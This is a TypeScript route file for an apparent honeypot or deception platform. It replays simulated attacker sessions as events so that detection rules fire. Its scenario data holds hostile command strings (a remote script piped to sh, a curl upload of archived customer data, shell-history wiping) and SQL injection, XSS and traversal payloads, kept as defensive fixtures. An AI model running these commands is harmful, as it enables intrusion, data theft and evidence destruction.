import { randomInt } from 'node:crypto';
import type { FastifyInstance } from 'fastify';
import { ulid } from 'ulid';
import { z } from 'zod';
import { db } from '../db/client.js';
import { env } from '../env.js';
import { audit } from '../lib/audit.js';
import { HttpError } from '../lib/errors.js';
import { parse } from '../lib/parse.js';
import { projectAccess, requireSession } from '../plugins/auth-session.js';
import { ingestEvents } from './ingest.js';

type Ev = Record<string, unknown>;
type Step = { gap: number; ev: Ev };

const web = (decoy: string, url: string, extra: Ev = {}): Ev => ({
  sensor: 'web',
  decoy_id: decoy,
  is_decoy: true,
  dst_service: `http:${url}`,
  event_type: 'http.request',
  method: 'GET',
  url,
  status_code: 200,
  ...extra,
});
const ssh = (type: string, extra: Ev = {}): Ev => ({
  sensor: 'ssh',
  decoy_id: 'ssh-db-backup-01',
  is_decoy: true,
  dst_service: 'ssh:22',
  event_type: type,
  ...extra,
});

const SQLMAP_UA = 'sqlmap/1.7#stable';
const FIREFOX_UA = 'Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0';
const HYDRA_UA = 'hydra/9.5';
const NIKTO_UA = 'Mozilla/5.0 (Nikto/2.5.0)';

/** A web login attempt against the admin decoy, as the agent normalises it. */
const webAuth = (outcome: 'success' | 'failure', extra: Ev = {}): Ev => ({
  sensor: 'web',
  decoy_id: 'web-admin-admin',
  is_decoy: true,
  dst_service: 'http:/admin/login',
  event_type: 'auth.attempt',
  method: 'POST',
  url: '/admin/login',
  outcome,
  ...extra,
});
/**
 * The token the `honeytoken` replay plants and then uses. Nothing joins this to
 * the `honeytokens` table — process-events stamps `first_used_at` by id and the
 * update is a harmless no-op when no such row was declared by an agent.
 */
const DEMO_HONEYTOKEN_ID = 'ht-acme-payments-key';

const SCENARIOS: Record<string, (ip: string) => Step[]> = {
  targeted: () => [
    {
      gap: 0,
      ev: web('web-admin-admin', '/admin', {
        user_agent: 'Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0',
      }),
    },
    {
      gap: 7,
      ev: web('web-bait-env', '/.env', {
        user_agent: 'Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0',
        outcome: 'success',
      }),
    },
    { gap: 9, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-OpenSSH_9.6' }) },
    {
      gap: 6,
      ev: ssh('auth.attempt', { username: 'deploy', password_masked: 'W***1', outcome: 'failure' }),
    },
    {
      gap: 8,
      ev: ssh('auth.attempt', { username: 'admin', password_clear: 'admin', outcome: 'success' }),
    },
    {
      gap: 11,
      ev: ssh('command.exec', { username: 'admin', command: 'whoami', outcome: 'success' }),
    },
    {
      gap: 8,
      ev: ssh('command.exec', { username: 'admin', command: 'uname -a && id', outcome: 'success' }),
    },
    {
      gap: 14,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'ls -la /srv/exports',
        outcome: 'success',
      }),
    },
    {
      gap: 12,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'cat /srv/exports/customer_data.csv',
        outcome: 'success',
      }),
    },
    {
      gap: 9,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'wget http://198.51.100.23/x.sh -O /tmp/x.sh',
        outcome: 'failure',
      }),
    },
    {
      gap: 16,
      ev: {
        sensor: 'sdk',
        is_decoy: false,
        dst_service: 'app:/api/payments',
        event_type: 'asset.access',
        asset_name: 'Payments API',
        method: 'GET',
        url: '/api/payments/export',
        status_code: 200,
        outcome: 'success',
      },
    },
  ],
  opportunistic: () => [
    { gap: 0, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-libssh_0.9.6' }) },
    ...['root', 'admin', 'ubuntu', 'test', 'oracle'].map(
      (u): Step => ({
        gap: 1,
        ev: ssh('auth.attempt', { username: u, password_masked: '1****6', outcome: 'failure' }),
      }),
    ),
    {
      gap: 1,
      ev: ssh('auth.attempt', { username: 'root', password_clear: 'toor', outcome: 'success' }),
    },
    {
      gap: 1,
      ev: ssh('command.exec', { username: 'root', command: 'uname -a', outcome: 'success' }),
    },
    {
      gap: 1,
      ev: ssh('command.exec', {
        username: 'root',
        command: 'cat /proc/cpuinfo',
        outcome: 'success',
      }),
    },
    {
      gap: 1,
      ev: ssh('command.exec', {
        username: 'root',
        command: 'curl -s http://198.51.100.99/m.sh | sh',
        outcome: 'failure',
      }),
    },
  ],
  noise: () => [
    { gap: 0, ev: web('web-admin-admin', '/', { user_agent: 'zgrab/0.x' }) },
    {
      gap: 1,
      ev: web('web-bait-env', '/robots.txt', { user_agent: 'zgrab/0.x', status_code: 404 }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', '/favicon.ico', { user_agent: 'zgrab/0.x', status_code: 404 }),
    },
  ],
  // Mirrors attacker-demo/attacker-api/scenarios/sqli.json: an sqlmap-style spray
  // of SQLi and traversal payloads at decoy paths. The strings are logged, never
  // executed; they exist so R05 fires once per exploit family.
  sqli: () => [
    {
      gap: 0,
      ev: web('web-admin-admin', "/products?id=1' OR '1'='1", {
        user_agent: SQLMAP_UA,
        status_code: 404,
      }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', '/products?id=1 UNION SELECT NULL,NULL,NULL--', {
        user_agent: SQLMAP_UA,
        status_code: 404,
      }),
    },
    {
      gap: 1,
      ev: web('web-bait-env', '/../../../../etc/passwd', {
        user_agent: SQLMAP_UA,
        status_code: 404,
      }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', '/admin?id=1;DROP TABLE users;--', {
        user_agent: SQLMAP_UA,
        status_code: 200,
      }),
    },
  ],
  // Mirrors attacker-demo/attacker-api/scenarios/exfil-cleanup.json: post-exploitation
  // with anti-forensics. Default-cred login (R06), archive + read the bait exports
  // (R11/R18), curl them to an external host (R09 transfer), then wipe history and logs
  // — the only scenario that reaches defence evasion (R17).
  'exfil-cleanup': () => [
    { gap: 0, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-OpenSSH_9.6' }) },
    {
      gap: 6,
      ev: ssh('auth.attempt', { username: 'admin', password_clear: 'admin', outcome: 'success' }),
    },
    {
      gap: 8,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'tar -czf /tmp/loot.tgz /srv/exports',
        outcome: 'success',
      }),
    },
    {
      gap: 7,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'cat /srv/exports/customer_data.csv',
        outcome: 'success',
      }),
    },
    {
      gap: 9,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'curl -T /tmp/loot.tgz http://198.51.100.9/',
        outcome: 'success',
      }),
    },
    {
      gap: 11,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'history -c; rm -f ~/.bash_history; unset HISTFILE',
        outcome: 'success',
      }),
    },
  ],
  dynamic: () => [
    { gap: 0, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-OpenSSH_9.6' }) },
    { gap: 5, ev: ssh('auth.attempt', { username: 'admin', password_clear: 'admin', outcome: 'success' }) },
    { gap: 7, ev: ssh('command.exec', { username: 'admin', command: 'cowsay deployment window', outcome: 'success' }) },
    { gap: 9, ev: ssh('command.exec', { username: 'admin', command: './inventory-probe --format compact', outcome: 'success' }) },
  ],
  // Mirrors attacker-demo/attacker-api/scenarios/web-exploit.json: a nikto-style sweep
  // carrying four exploit families — XSS, command injection, traversal and SQLi. R05
  // detects each (+10) but is capped at 20 (RULE_POINT_CAPS.R05), so two families show
  // in the ledger; the nikto user-agent trips R03.
  'web-exploit': () => [
    {
      gap: 0,
      ev: web('web-admin-admin', '/search?q=<script>alert(1)</script>', {
        user_agent: NIKTO_UA,
        status_code: 404,
      }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', '/ping?host=127.0.0.1;cat /etc/passwd', {
        user_agent: NIKTO_UA,
        status_code: 404,
      }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', "/products?id=1' OR '1'='1", {
        user_agent: NIKTO_UA,
        status_code: 404,
      }),
    },
  ],
  // Mirrors attacker-demo/attacker-api/scenarios/web-bruteforce.json: a hydra-style
  // credential-stuffing burst at the /admin login. Six failures inside 60 s trip R04;
  // the default admin/admin then succeeds (R06). The hydra user-agent trips R03.
  'web-bruteforce': () => [
    { gap: 0, ev: web('web-admin-admin', '/admin', { user_agent: HYDRA_UA }) },
    ...Array.from({ length: 6 }, (): Step => ({
      gap: 2,
      ev: webAuth('failure', {
        user_agent: HYDRA_UA,
        username: 'admin',
        password_masked: 'P*******1',
      }),
    })),
    {
      gap: 2,
      ev: webAuth('success', {
        user_agent: HYDRA_UA,
        username: 'admin',
        password_clear: 'admin',
      }),
    },
  ],
  // Mirrors attacker-demo/attacker-api/scenarios/honeytoken.json: the bait file is
  // served from a decoy, then the stolen token is used against a real asset. The
  // second event is what makes this Critical — R16 carries floor: 'critical'.
  honeytoken: () => [
    {
      gap: 0,
      ev: web('web-bait-env', '/.env', { user_agent: FIREFOX_UA, outcome: 'success' }),
    },
    {
      gap: 14,
      ev: {
        sensor: 'sdk',
        is_decoy: false,
        dst_service: 'app:/api/payments',
        event_type: 'honeytoken.use',
        honeytoken_id: DEMO_HONEYTOKEN_ID,
        asset_name: 'Payments API',
        method: 'GET',
        url: '/api/payments',
        status_code: 200,
        outcome: 'success',
      },
    },
  ],
};

/**
 * Public scenario names the clients send, mapped onto the canonical replays above.
 * The dashboard's replay button sends `ps-use-case`; the attacker console's safe
 * mode sends the id of whichever scenario was clicked (`ps-attacker`, `sqli`,
 * `honeytoken`, `noise`, `opportunistic`). Both PS names describe the same
 * targeted story as `targeted` — probe, brute force, read decoy data, touch the
 * real asset — so they alias onto it. Everything else has its own entry, because
 * silently substituting `targeted` is what made safe mode replay the wrong story.
 */
const SCENARIO_ALIASES: Record<string, string> = {
  'ps-use-case': 'targeted',
  'ps-attacker': 'targeted',
};

/** Every name a client may send, for the error when it sends something else. */
const SCENARIO_NAMES = [...Object.keys(SCENARIOS), ...Object.keys(SCENARIO_ALIASES)].sort();

/**
 * Resolve a client-supplied scenario name to a canonical one, or reject it by
 * name. `Object.hasOwn`, not `in`: `in` would accept inherited keys such as
 * `constructor` and then call a non-scenario off the prototype.
 */
export function resolveScenario(requested: string): string {
  const canonical = SCENARIO_ALIASES[requested] ?? requested;
  if (!Object.hasOwn(SCENARIOS, canonical))
    throw new HttpError(422, 'unknown_scenario', `Unknown replay scenario "${requested}"`, {
      requested,
      accepted: SCENARIO_NAMES,
    });
  return canonical;
}

/**
 * Build the batch a replay ingests: the scenario's events wrapped in the envelope
 * ingest requires, re-timed so the last event lands at `now` and earlier ones are
 * spread backwards by their gaps. `scenario` is resolved again so this is safe to
 * call with any client-supplied name.
 */
export function buildReplayEvents(scenario: string, ip: string, now = Date.now()): Ev[] {
  const steps = SCENARIOS[resolveScenario(scenario)]!(ip);
  const total = steps.reduce((s, x) => s + x.gap, 0);
  let t = now - total * 1000;
  const session = `demo-${ulid().slice(-8)}`;
  return steps.map((s) => {
    t += s.gap * 1000;
    return {
      id: ulid(t),
      schema_version: 1,
      timestamp: new Date(t).toISOString(),
      src_ip: ip,
      session_id: session,
      count: 1,
      simulated: true,
      ...s.ev,
    };
  });
}

const Body = z.object({
  scenario: z.string().max(64).default('targeted'),
  scenarioId: z.string().max(64).optional(),
  src_ip: z.union([z.ipv4(), z.ipv6()]).optional(),
});

export async function demoRoutes(app: FastifyInstance): Promise<void> {
  app.post('/v1/projects/:pid/demo/replay', { preHandler: requireSession }, async (req, reply) => {
    const { project, user } = await projectAccess(
      req,
      (req.params as { pid: string }).pid,
      'owner',
    );
    if (!env.DEMO_MODE && !['demo', 'dev', 'development'].includes(project.environment)) {
      throw new HttpError(
        403,
        'not_demo_project',
        'Replay is only available for demo projects (environment=demo)',
      );
    }
    const body = parse(Body, req.body ?? {});
    const requestedScenario = body.scenarioId ?? body.scenario;
    const scenario = resolveScenario(requestedScenario);
    const ip = body.src_ip ?? `203.0.113.${randomInt(2, 250)}`;
    const raw = buildReplayEvents(scenario, ip);
    const res = await ingestEvents({ projectId: project.id, rawEvents: raw });
    await audit(db, {
      orgId: project.orgId,
      projectId: project.id,
      actorType: 'user',
      actorId: user.id,
      action: 'demo.replay',
      metadata: { scenario, requested_scenario: requestedScenario, src_ip: ip },
      req,
    });
    return reply.status(202).send({
      scenario,
      src_ip: ip,
      accepted: res.accepted,
      duplicates: res.duplicates,
      rejected: res.rejected,
    });
  });
}
